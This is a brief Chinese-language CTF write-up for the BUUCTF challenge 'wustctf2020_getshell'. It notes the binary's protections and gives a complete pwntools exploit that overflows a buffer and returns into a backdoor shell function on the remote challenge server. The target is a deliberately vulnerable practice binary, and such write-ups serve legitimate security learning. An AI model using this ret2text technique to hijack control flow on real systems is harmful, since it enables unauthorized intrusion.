## 思路分析

1. 目前信息：
   
   - vulnerable函数存在溢出点
   - 有后门函数shell
   - No canary found
   - NX enabled
   - No PIE (0x8048000)
2. 思路：
   - 32位ret2text

## exp

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
pwnfile = '/root/pwn/buuctf/wustctf2020_getshell/wustctf2020_getshell'
io = remote('node4.buuoj.cn', 27378)
# io = process(pwnfile)
elf = ELF(pwnfile)
padding = 0x18+4
back_door = elf.symbols['shell']
payload=flat(['a'*padding,back_door])
io.recv()
io.send(payload)
io.interactive()
```
